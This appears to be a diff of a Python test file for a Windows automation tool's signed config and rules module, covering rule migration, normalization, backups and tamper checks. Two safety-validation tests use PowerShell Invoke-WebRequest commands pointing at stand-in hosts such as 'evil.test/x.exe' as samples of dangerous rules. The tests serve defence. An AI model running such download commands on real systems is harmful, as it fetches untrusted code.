@@ -17,6 +17,7 @@ ACTIONS_DIR = os.path.join(os.path.dirname(config_mod.__file__), "actions")
 def isolated_config(tmp_path, monkeypatch):
     config_file = str(tmp_path / "config.json")
     monkeypatch.setattr(config_mod, "CONFIG_FILE", config_file)
+    monkeypatch.setattr(config_mod, "RULES_FILE", str(tmp_path / "rules.json"))
     return config_file
 
 
@@ -45,18 +46,10 @@ class TestActionManifests:
 
 
 class TestAllowedActionTypes:
-    def test_all_actions_in_whitelist(self):
-        builtin = {
-            name for name in os.listdir(ACTIONS_DIR)
-            if os.path.isdir(os.path.join(ACTIONS_DIR, name))
-        }
-        used = {
-            action["type"]
-            for rule in config_mod.DEFAULT_CONFIG["rules"]
-            for action in rule["actions"]
-        }
-        assert used
-        assert used <= builtin
+    def test_default_config_has_no_rules(self):
+        # 规则拆到 rules.json 后，默认配置不再携带任何示例规则
+        assert "rules" not in config_mod.DEFAULT_CONFIG
+        assert config_mod._normalize_rules(config_mod.DEFAULT_CONFIG.get("rules")) == []
 
 
 class TestDangerousCommand:
@@ -135,48 +128,57 @@ class TestDangerousCommand:
         _warnings, errors = config_mod._validate_rules_safety(safe_rules)
         assert errors == []
 
+    def test_rule_safety_checks_failure_actions(self):
+        rules = [{
+            "name": "危险补救",
+            "actions": [{
+                "type": "notify",
+                "params": {},
+                "failure_actions": [{
+                    "type": "run_powershell",
+                    "params": {"command": "Invoke-WebRequest http://evil.test/x.exe"},
+                }],
+            }],
+        }]
+
+        _warnings, errors = config_mod._validate_rules_safety(rules)
+
+        assert len(errors) == 1
+        assert "危险补救" in errors[0]
+
 
 class TestGetConfig:
     def test_config_file_not_exists_creates_default(self, isolated_config):
         config = config_mod.get_config()
         assert os.path.exists(isolated_config)
-        assert len(config["rules"]) == 6
+        assert "rules" not in config
 
     def test_config_creates_missing_dir(self, tmp_path, monkeypatch):
-        nested = str(tmp_path / "deep" / "nested" / "config.json")
-        monkeypatch.setattr(config_mod, "CONFIG_FILE", nested)
+        nested_dir = tmp_path / "deep" / "nested"
+        monkeypatch.setattr(config_mod, "CONFIG_FILE", str(nested_dir / "config.json"))
+        monkeypatch.setattr(config_mod, "RULES_FILE", str(nested_dir / "rules.json"))
         config = config_mod.get_config()
-        assert os.path.isdir(os.path.dirname(nested))
-        assert len(config["rules"]) == 6
+        assert os.path.isdir(str(nested_dir))
+        assert "rules" not in config
 
     def test_config_file_exists_valid(self, isolated_config, capsys):
         config_mod.save_config(config_mod._default_v2_config())
         capsys.readouterr()
         config = config_mod.get_config()
-        assert len(config["rules"]) == 6
+        assert "rules" not in config
         assert "Config loaded" in capsys.readouterr().out
 
     def test_config_returns_deepcopy(self, isolated_config):
         config = config_mod.get_config()
         assert config is not config_mod.DEFAULT_CONFIG
-        config["rules"].pop()
+        config["disabled_plugins"]["triggers"].append("x")
         fresh = config_mod.get_config()
-        assert len(fresh["rules"]) == 6
+        assert fresh["disabled_plugins"]["triggers"] == []
 
-    def test_default_config_has_six_rules(self, isolated_config):
-        config = config_mod.get_config()
-        assert len(config["rules"]) == 6
-
-    def test_default_config_rules_have_expected_structure(self, isolated_config):
-        config = config_mod.get_config()
-        for rule in config["rules"]:
-            assert isinstance(rule["name"], str)
-            assert rule["event"]["type"] == "process_state"
-            assert "process_name" in rule["event"]["params"]
-            assert rule["event"]["params"]["state"] in ("running", "stopped")
-            types = [action["type"] for action in rule["actions"]]
-            assert "set_volume" in types
-            assert "notify" in types
+    def test_default_rules_file_is_empty(self, isolated_config):
+        # 全新安装没有可迁移的规则，rules.json 写出来就是空的
+        assert config_mod.get_rules() == []
+        assert os.path.exists(config_mod.RULES_FILE)
 
     def test_config_processes_legacy_becomes_rules(self, isolated_config, capsys):
         write_signed({
@@ -190,8 +192,10 @@ class TestGetConfig:
             ]
         })
         config = config_mod.get_config()
-        assert len(config["rules"]) == 1
-        rule = config["rules"][0]
+        assert "rules" not in config
+        rules = config_mod.get_rules()
+        assert len(rules) == 1
+        rule = rules[0]
         assert rule["name"] == "测试软件 音量规则"
         assert rule["event"]["params"]["process_name"] == "test.exe"
         assert rule["actions"][0]["params"]["action"] == "half"
@@ -200,7 +204,8 @@ class TestGetConfig:
     def test_config_with_only_processes_becomes_empty_rules(self, isolated_config):
         write_signed({"processes": []})
         config = config_mod.get_config()
-        assert config.get("rules", []) == []
+        assert "rules" not in config
+        assert config_mod.get_rules() == []
 
     def test_legacy_trigger_config_becomes_normalized(self, isolated_config):
         write_signed({
@@ -216,11 +221,12 @@ class TestGetConfig:
             ]
         })
         config = config_mod.get_config()
-        rule = config["rules"][0]
+        assert config["schema_version"] == 2
+        rule = config_mod.get_rules()[0]
+        assert rule["rule_id"].startswith("r_")
         assert "trigger" not in rule
         assert rule["event"]["type"] == "process_state"
         assert rule["event"]["binding_id"].startswith("t_")
-        assert config["schema_version"] == 2
 
     def test_missing_secret_pauses_engine(self, isolated_config):
         write_signed(config_mod._default_v2_config())
@@ -242,7 +248,7 @@ class TestGetConfig:
             f.write("{不是合法的 JSON")
         capsys.readouterr()
         config = config_mod.get_config()
-        assert len(config["rules"]) == 6
+        assert "rules" not in config
         assert "配置文件损坏" in capsys.readouterr().err
 
     def test_backup_without_secret_is_rejected(self, isolated_config, capsys):
@@ -256,12 +262,15 @@ class TestGetConfig:
         config = config_mod.get_config()
         err = capsys.readouterr().err
         assert "签名密钥缺失，无法验证备份，拒绝恢复" in err
-        assert len(config["rules"]) == 6
+        assert "rules" not in config
 
 
 class TestNormalizeConfig:
     def test_empty_dict(self):
-        assert config_mod._normalize_config({}) == {}
+        assert config_mod._normalize_config({}) == {
+            "schema_version": 2,
+            "settings": {"admin_authorization_mode": "per_execution"},
+        }
 
     def test_none_input(self):
         assert config_mod._normalize_config(None) is None
@@ -277,7 +286,9 @@ class TestNormalizeConfig:
 
     def test_no_rules_no_processes(self):
         config = {"disabled_plugins": {"triggers": [], "actions": []}}
-        assert config_mod._normalize_config(config) == config
+        result = config_mod._normalize_config(config)
+        assert result["disabled_plugins"] == {"triggers": [], "actions": []}
+        assert result["schema_version"] == 2
 
     def test_already_normalized_rules(self):
         config = {
@@ -292,11 +303,70 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        result = config_mod._normalize_config(config)
-        assert result["schema_version"] == 2
-        rule = result["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
+        assert rule["rule_id"].startswith("r_")
         assert rule["event"]["binding_id"].startswith("t_")
         assert rule["actions"][0]["binding_id"].startswith("a_")
+
+    def test_failure_actions_receive_unique_binding_ids(self):
+        rules = [{
+            "name": "规则",
+            "event": {"type": "manual", "params": {}},
+            "actions": [{
+                "type": "notify",
+                "binding_id": "a_stable01",
+                "params": {},
+                "failure_actions": [
+                    {"type": "notify", "params": {}},
+                    {"type": "notify", "binding_id": "a_stable01", "params": {}},
+                ],
+            }],
+        }]
+
+        rule = config_mod._normalize_rules(rules)[0]
+        ids = [rule["actions"][0]["binding_id"]] + [
+            action["binding_id"] for action in rule["actions"][0]["failure_actions"]
+        ]
+
+        assert len(set(ids)) == 3
+        assert all(binding_id.startswith("a_") for binding_id in ids)
+
+    def test_rule_ids_survive_normalization_and_duplicates_are_replaced(self):
+        rules = [
+            {
+                "rule_id": "r_stable01",
+                "name": "一",
+                "event": {"type": "manual", "params": {}},
+                "actions": [],
+            },
+            {
+                "rule_id": "r_stable01",
+                "name": "二",
+                "event": {"type": "manual", "params": {}},
+                "actions": [],
+            },
+        ]
+
+        first = config_mod._normalize_rules(rules)
+        second = config_mod._normalize_rules(first)
+
+        assert first[0]["rule_id"] == "r_stable01"
+        assert first[1]["rule_id"].startswith("r_")
+        assert first[1]["rule_id"] != first[0]["rule_id"]
+        assert [rule["rule_id"] for rule in second] == [
+            rule["rule_id"] for rule in first
+        ]
+
+    def test_admin_authorization_mode_defaults_to_per_execution(self):
+        result = config_mod._normalize_config({"rules": []})
+        assert result["settings"]["admin_authorization_mode"] == "per_execution"
+
+    def test_invalid_admin_authorization_mode_is_replaced(self):
+        result = config_mod._normalize_config({
+            "rules": [],
+            "settings": {"admin_authorization_mode": "always"},
+        })
+        assert result["settings"]["admin_authorization_mode"] == "per_execution"
 
     def test_trigger_to_event_migration(self):
         config = {
@@ -308,7 +378,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         assert "trigger" not in rule
         assert rule["event"]["type"] == "hotkey"
 
@@ -323,7 +393,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         assert rule["name"] == "保留名字"
         assert rule["enabled"] is True
         assert rule["event"]["type"] == "hotkey"
@@ -339,7 +409,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         assert "trigger" not in rule
         # event 已存在时 trigger 不会覆盖它
         assert rule["event"]["type"] == "manual"
@@ -356,9 +426,9 @@ class TestNormalizeConfig:
                 },
             ]
         }
-        result = config_mod._normalize_config(config)
-        assert len(result["rules"]) == 1
-        assert result["rules"][0]["name"] == "有效"
+        result = config_mod._normalize_rules(config["rules"])
+        assert len(result) == 1
+        assert result[0]["name"] == "有效"
 
     def test_preserves_extra_top_level_keys_in_rules(self):
         config = {
@@ -372,6 +442,7 @@ class TestNormalizeConfig:
         assert result["disabled_plugins"] == {"triggers": ["x"], "actions": []}
         assert result["custom_key"] == 123
         assert result["schema_version"] == 2
+        assert "rules" not in result
 
     def test_processes_to_rules_basic(self):
         config = {
@@ -384,10 +455,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        result = config_mod._normalize_config(config)
-        assert result["schema_version"] == 2
-        assert "processes" not in result
-        rule = result["rules"][0]
+        rule = config_mod._extract_legacy_rules(config)[0]
         assert rule["name"] == "应用 音量规则"
         assert rule["event"] == {
             "type": "process_state",
@@ -403,11 +471,11 @@ class TestNormalizeConfig:
 
     def test_processes_empty_list(self):
         config = {"processes": []}
-        assert config_mod._normalize_config(config) == config
+        assert config_mod._extract_legacy_rules(config) == []
 
     def test_processes_not_a_list(self):
         config = {"processes": "not a list"}
-        assert config_mod._normalize_config(config) == config
+        assert config_mod._extract_legacy_rules(config) == []
 
     def test_processes_none_notification(self):
         config = {
@@ -415,19 +483,19 @@ class TestNormalizeConfig:
                 {"process_name": "a.exe", "software_name": "A", "notification": None}
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._extract_legacy_rules(config)[0]
         notify = rule["actions"][1]
         assert notify["params"]["title"] == "A 正在运行"
         assert notify["params"]["message"] == ""
 
     def test_processes_empty_notification_object(self):
         config = {"processes": [{"process_name": "a.exe", "software_name": "A", "notification": {}}]}
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._extract_legacy_rules(config)[0]
         assert rule["actions"][1]["params"] == {"title": "A 正在运行", "message": ""}
 
     def test_processes_missing_optional_fields(self):
         config = {"processes": [{"process_name": "solo.exe"}]}
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._extract_legacy_rules(config)[0]
         assert rule["name"] == "solo.exe 音量规则"
         assert rule["actions"][0]["params"]["action"] == "max"
 
@@ -438,9 +506,9 @@ class TestNormalizeConfig:
                 {"process_name": "real.exe", "software_name": "真实"},
             ]
         }
-        result = config_mod._normalize_config(config)
-        assert len(result["rules"]) == 1
-        assert result["rules"][0]["name"] == "真实 音量规则"
+        result = config_mod._extract_legacy_rules(config)
+        assert len(result) == 1
+        assert result[0]["name"] == "真实 音量规则"
 
     def test_preserves_top_level_keys_in_processes_migration(self):
         config = {
@@ -465,7 +533,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         condition = rule["condition"]
         assert condition["op"] == "all"
         assert "events" not in condition
@@ -497,7 +565,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         outer = rule["condition"]
         assert "within_seconds" not in outer
         inner = outer["children"][0]
@@ -519,7 +587,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         assert "condition" not in rule
         assert rule["event"]["type"] == "process_state"
 
@@ -536,7 +604,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         first, second = rule["actions"]
         assert "id" not in first
         node = first["binding_id"]
@@ -556,7 +624,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         assert rule["actions"][0]["params"]["title"] == {
             "$ref": {"scope": "event", "path": ["path"]}
         }
@@ -573,7 +641,7 @@ class TestNormalizeConfig:
                 }
             ]
         }
-        rule = config_mod._normalize_config(config)["rules"][0]
+        rule = config_mod._normalize_rules(config["rules"])[0]
         assert rule["actions"][0]["params"]["title"] == "文件: {{ event.payload.path }}"
 
 
@@ -582,7 +650,7 @@ class TestVerifiedConfig:
         config_mod.save_config(config_mod._default_v2_config())
         with open(isolated_config, "r", encoding="utf-8") as f:
             data = json.load(f)
-        data["rules"][0]["name"] = "被篡改的规则"
+        data["settings"]["admin_authorization_mode"] = "engine_start"
         with open(isolated_config, "w", encoding="utf-8") as f:
             json.dump(data, f, ensure_ascii=False)
         with pytest.raises(ConfigValidationError) as excinfo:
@@ -598,5 +666,196 @@ class TestVerifiedConfig:
         with open(isolated_config, "r", encoding="utf-8") as f:
             saved = json.load(f)
         assert "processes" not in saved
-        assert len(saved["rules"]) == 1
+        assert "rules" not in saved
         assert config_mod._SIGNATURE_KEY in saved
+
+
+class TestRulesSplit:
+    def test_split_legacy_config_produces_two_verified_files(self, isolated_config):
+        # 旧配置自动拆分后，config.json 和 rules.json 都应通过验签
+        write_signed({
+            "rules": [
+                {
+                    "name": "旧规则",
+                    "event": {"type": "manual", "params": {}},
+                    "actions": [{"type": "notify", "params": {"title": "t", "message": "m"}}],
+                }
+            ],
+        })
+        config_mod.get_config()
+        config = config_mod.load_verified_config()
+        assert "rules" not in config
+        rules = config_mod.load_verified_rules()
+        assert len(rules) == 1
+        assert rules[0]["name"] == "旧规则"
+
+    def test_corrupt_rules_file_recovers_from_backup(self, isolated_config, capsys):
+        rule = {
+            "name": "备份规则",
+            "event": {"type": "manual", "params": {}},
+            "actions": [],
+        }
+        assert config_mod.save_rules([rule])
+        # 二次保存生成 rules.json.bak，再损坏主文件
+        assert config_mod.save_rules([rule])
+        with open(config_mod.RULES_FILE, "w", encoding="utf-8") as f:
+            f.write("{不是合法的 JSON")
+        capsys.readouterr()
+        rules = config_mod.get_rules()
+        assert "从备份成功恢复规则" in capsys.readouterr().err
+        assert len(rules) == 1
+        assert rules[0]["name"] == "备份规则"
+
+    def test_tampered_rules_file_is_rejected(self, isolated_config):
+        rule = {
+            "name": "规则",
+            "event": {"type": "manual", "params": {}},
+            "actions": [],
+        }
+        assert config_mod.save_rules([rule])
+        with open(config_mod.RULES_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        data["rules"][0]["name"] = "被篡改的规则"
+        with open(config_mod.RULES_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False)
+        with pytest.raises(ConfigValidationError) as excinfo:
+            config_mod.load_verified_rules()
+        assert "签名校验失败" in str(excinfo.value)
+
+    def test_get_rules_rejects_signed_dangerous_rule(self, isolated_config):
+        assert config_mod.save_rules([{
+            "name": "危险规则",
+            "event": {"type": "manual", "params": {}},
+            "actions": [{
+                "type": "run_powershell",
+                "params": {"command": "Invoke-WebRequest https://example.test/a"},
+            }],
+        }])
+        with pytest.raises(ConfigValidationError, match="规则安全校验失败"):
+            config_mod.get_rules()
+
+    def test_tampered_existing_rules_file_blocks_legacy_merge(self, isolated_config):
+        assert config_mod.save_rules([{
+            "name": "已有规则",
+            "event": {"type": "manual", "params": {}},
+            "actions": [],
+        }])
+        with open(config_mod.RULES_FILE, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        data["rules"][0]["name"] = "改过名字的规则"
+        with open(config_mod.RULES_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False)
+        write_signed({
+            "rules": [
+                {
+                    "name": "旧规则",
+                    "event": {"type": "manual", "params": {}},
+                    "actions": [{"type": "notify", "params": {"title": "t", "message": "m"}}],
+                }
+            ],
+        })
+        with pytest.raises(ConfigValidationError, match="规则签名校验失败"):
+            config_mod.get_config()
+        with open(config_mod.RULES_FILE, "r", encoding="utf-8") as f:
+            assert json.load(f)["rules"][0]["name"] == "改过名字的规则"
+
+    def test_split_keeps_premigration_snapshot(self, isolated_config):
+        # 拆分前的旧配置全量快照不被后续保存冲掉
+        write_signed({
+            "rules": [
+                {
+                    "name": "旧规则",
+                    "event": {"type": "manual", "params": {}},
+                    "actions": [],
+                }
+            ],
+        })
+        config_mod.get_config()
+        config_mod.save_config({})
+        backup = config_mod._premigration_backup_path()
+        assert os.path.exists(backup)
+        with open(backup, "r", encoding="utf-8") as f:
+            snapshot = json.load(f)
+        assert snapshot["rules"][0]["name"] == "旧规则"
+
+    def _write_legacy_backup(self, legacy: dict) -> None:
+        """先写带旧规则的配置，再保存一次让上一份文件落进 config.json.bak"""
+        write_signed(legacy)
+        config_mod.save_config(legacy)
+
+    def test_recovery_aborts_when_save_rules_fails(
+        self, isolated_config, monkeypatch, capsys
+    ):
+        # rules.json 不存在时走 save_rules，写失败就中止恢复，备份里的规则不能被瘦身掉
+        self._write_legacy_backup({
+            "rules": [
+                {
+                    "name": "旧规则",
+                    "event": {"type": "manual", "params": {}},
+                    "actions": [],
+                }
+            ],
+        })
+        monkeypatch.setattr(config_mod, "save_rules", lambda rules: False)
+        capsys.readouterr()
+        assert config_mod._try_recover_from_backup() is None
+        assert "放弃备份恢复" in capsys.readouterr().err
+        assert not os.path.exists(config_mod.RULES_FILE)
+        with open(config_mod._backup_path(), "r", encoding="utf-8") as f:
+            assert json.load(f)["rules"][0]["name"] == "旧规则"
+
+    def test_recovery_aborts_when_merge_fails(
+        self, isolated_config, monkeypatch, capsys
+    ):
+        # rules.json 已存在时走合并，合并写失败同样中止恢复
+        assert config_mod.save_rules([{
+            "name": "已有规则",
+            "event": {"type": "manual", "params": {}},
+            "actions": [],
+        }])
+        self._write_legacy_backup({
+            "rules": [
+                {
+                    "name": "旧规则",
+                    "event": {"type": "manual", "params": {}},
+                    "actions": [],
+                }
+            ],
+        })
+        monkeypatch.setattr(
+            config_mod, "_merge_rules_into_file", lambda rules: False
+        )
+        capsys.readouterr()
+        assert config_mod._try_recover_from_backup() is None
+        assert "放弃备份恢复" in capsys.readouterr().err
+        # rules.json 保持原样，旧规则没被合进去
+        rules = config_mod.load_verified_rules()
+        assert len(rules) == 1
+        assert rules[0]["name"] == "已有规则"
+
+    def test_repeated_migration_does_not_duplicate_rules(
+        self, isolated_config, monkeypatch
+    ):
+        # 第一次迁移合并成功后瘦身失败，再次迁移不能追加重复规则
+        write_signed({
+            "rules": [
+                {
+                    "rule_id": "r_stable01",
+                    "name": "旧规则",
+                    "event": {"type": "manual", "params": {}},
+                    "actions": [],
+                }
+            ],
+        })
+        real_save_config = config_mod.save_config
+        monkeypatch.setattr(config_mod, "save_config", lambda config: False)
+        with pytest.raises(ConfigValidationError, match="配置文件写入失败"):
+            config_mod._migrate_rules_file()
+        monkeypatch.setattr(config_mod, "save_config", real_save_config)
+
+        config_mod._migrate_rules_file()
+
+        rules = config_mod.load_verified_rules()
+        assert len(rules) == 1
+        assert rules[0]["rule_id"] == "r_stable01"
+        assert rules[0]["name"] == "旧规则"
